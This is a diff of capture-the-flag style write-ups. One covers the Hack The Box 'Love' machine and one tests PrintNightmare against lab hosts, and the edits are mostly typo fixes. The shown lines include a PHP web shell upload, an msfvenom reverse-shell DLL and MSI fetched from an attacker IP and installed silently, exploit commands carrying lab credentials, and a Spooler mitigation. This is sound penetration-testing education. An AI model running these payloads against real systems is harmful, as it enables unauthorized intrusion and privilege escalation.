@@ -119,12 +119,12 @@ SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;
 <li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
 <li>SMB on port 445, good start.</li>
 <li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
-<li>WinRM on 5985/6, I will use this for lateral movement.</li>
+<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
 </ul>
 <p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
-<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code></p>
+<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «love» «10.10.14.51» 
-$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt; /etc/hosts
+$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
 </code></pre></div><h2 id="enumeration">Enumeration</h2>
 <h3 id="tcp-445---smb">TCP 445 - SMB</h3>
 <p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
@@ -215,13 +215,13 @@ connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <spa
 GET /iamf HTTP/1.1
 Host: 10.10.14.51
 Accept: */*
-</code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 hash.</p>
+</code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
 <p>Playing a bit with it reveals that it can render HTML.</p>
 <p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
 </p>
 <p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
 <h3 id="tcp-443---website">TCP 443 - Website</h3>
-<p>On HTTPS, the SSL certificate on leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
+<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
 <p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
 </p>
 <p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
@@ -256,7 +256,7 @@ Accept: */*
 <p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
 <p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
 </p>
-<p>When I reload the page, I see the voter is there with broken photo, and that because it loads php as image.</p>
+<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
 <p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
 </p>
 <p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
@@ -300,7 +300,7 @@ PS C:<span class="se">\U</span>sers<span class="se">\P</span>hoebe<span class="s
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="shell-as-system">Shell as SYSTEM</h3>
 <h4 id="enumeration-1">Enumeration</h4>
-<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated (SYSTEM) mode, and it can be abused to install a malicious <code>.msi</code> package.</p>
+<p>WinPEAS finds that <code>AlwaysInstallElevated</code> is set to 1. This means installation of an app always runs in elevated mode (SYSTEM), and it can be abused to install a malicious <code>.msi</code> package.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">[+] Checking AlwaysInstallElevated
    [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
     AlwaysInstallElevated set to 1 in HKLM!
@@ -315,7 +315,7 @@ No encoder specified, outputting raw payload
 Payload size: <span class="m">270</span> bytes
 Final size of msi file: <span class="m">159744</span> bytes
 Saved as: iamf.msi
-</code></pre></div><p>On Love, I will grab the msi and install the package it immediately.</p>
+</code></pre></div><p>On Love, I will grab the msi and install the package immediately.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; curl.exe -O 10.10.14.53/iamf.msi
 PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; msiexec /quiet /qn /i iamf.msi
 PS C:<span class="se">\U</span>sers<span class="se">\P</span>ublic&gt; net user
@@ -434,7 +434,7 @@ running egg_info
 <p>Before generating a DLL, I will create a <code>dll</code> folder first under the <code>printnightmare</code> folder.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «printnightmare» «10.10.14.75» 
 $ mkdir dll
-</code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connects back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
+</code></pre></div><p>I will be using <code>msfvenom</code> to generate the DLL . Upon a successful exploitation, this DLL will connect back to my attacking machine on port 4444, in short, it&rsquo;s a reverse shell.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «dll» «10.10.14.75» 
 $ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.75 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f dll &gt; revshell.dll  
 <span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -580,7 +580,7 @@ Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
 impacket.dcerpc.v5.rprn.DCERPCSessionError: RPRN SessionError: code: 0xe1 - ERROR_VIRUS_INFECTED - Operation did not <span class="nb">complete</span> successfully because the file contains a virus or potentially unwanted software
 </code></pre></div><p>No problem! The conclusion here is that Bastion was vulnerable.</p>
 <h4 id="101010134-heist">[10.10.10.134] Heist</h4>
-<p>On Heist, the exploit didn&rsquo;t show an indication of a successful exploitation.</p>
+<p>On Heist, the exploit didn&rsquo;t show any indication of a successful exploitation.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> 
 $ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;</span>@10.10.10.149 <span class="s1">&#39;\\10.10.14.75\ef\revshell.dll&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.149<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
@@ -593,7 +593,7 @@ $ python3 CVE-2021-1675.py heist/hazard:<span class="s1">&#39;stealth1agent&#39;
 Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
 ...<span class="o">[</span>SNIP<span class="o">]</span>...
 impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING<span class="o">(</span>The specified named pipe is in the closing state.<span class="o">)</span>
-</code></pre></div><p>But strangely, I got a shell in my listener.</p>
+</code></pre></div><p>But strangely, I got a shell on my listener.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «printnightmare» «10.10.14.75» 
 $ nc -nvlp <span class="m">4444</span>
 listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
@@ -681,13 +681,13 @@ Ethernet adapter Ethernet0:
 <h4 id="status_pipe_closing">STATUS_PIPE_CLOSING</h4>
 <p>I&rsquo;m sure that the following error is caused by my DLL payload.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">impacket.smb3.SessionError: SMB SessionError: STATUS_PIPE_CLOSING(The specified named pipe is in the closing state.)
-</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread), I use the DLL for reverse shell.</p>
+</code></pre></div><p>This is probably because, instead of using the DLL to create a user (one time load / execution / thread / I don&rsquo;t know~), I use the DLL for reverse shell.</p>
 <p><del>I wanted to generate my own payload to test but my Visual Studio somehow didn&rsquo;t want me to install the Windows SDK</del>  (Fixed on <a href="https://fahmifj.github.io/blog/windows-10-troubleshoot-permissions/">this post</a>).</p>
 <p>So I stole <a href="https://github.com/fahmifj/PrintNightmare-kit/blob/main/generate-nightmaredll.ps1">this payload</a> from this <a href="https://github.com/calebstewart/CVE-2021-1675">PoC</a> created by Caleb Stewart and John Hammond.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS /opt/PrintNightmare/dll&gt; Import-Module ./generate-nightmaredll.ps1
 PS /opt/PrintNightmare/dll&gt; Get-NightmareDLL
 <span class="o">[</span>+<span class="o">]</span> Created payload at /opt/printnightmare/dll/nightmare.dll
-</code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it displayed the proper message of a successful exploitation.</p>
+</code></pre></div><p>I ran the exploit again on Atom, but this time it didn&rsquo;t crash, instead it showed the indication of a successful exploitation.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span>impacket-venv<span class="o">)</span> → kali@kali «CVE-2021-1675-cube0x0» «10.10.14.75» git:<span class="o">(</span>main<span class="o">)</span> ✗ 
 $ python3 CVE-2021-1675.py ATOM/jason:<span class="s1">&#39;kidvscat_electron_@123&#39;</span>@10.10.10.237 <span class="s1">&#39;\\10.10.14.75\ef\nightmare.dll&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> Connecting to ncacn_np:10.10.10.237<span class="o">[</span><span class="se">\P</span>IPE<span class="se">\s</span>poolss<span class="o">]</span>
@@ -742,7 +742,7 @@ ATOM
     <span class="p">}</span>
     <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
 <span class="p">}</span>
-</code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler ( <code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
+</code></pre></div><p>The code can be compiled from Linux using <code>mingw-w64</code> compiler (<code>sudo apt install mingw-w64</code>). I will run the following command to compile the DLL.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
 </code></pre></div><p><del>I don&rsquo;t demo this DLL since the process and the result are the same 😅</del>.</p>
 <p>On Bastion, although the add user payload can evade the AV, I&rsquo;m unable to login using the created user via WinRM. However,  <code>impacket-psexec</code> will do.</p>
@@ -781,7 +781,7 @@ Running  Spooler            Print Spooler
 </code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
 <p><div class="img-container"><img src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  /></div>
 </p>
-<p>So, the conclusion is it worked! But, the downside is you loss the ability to print from both local and remote 🙃.</p>
+<p>The workaround is worked! But, the downside is thyou loss the ability to print from both local and remote 🙃.</p>
 <p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
 <hr>
 <h2 id="references">References</h2>
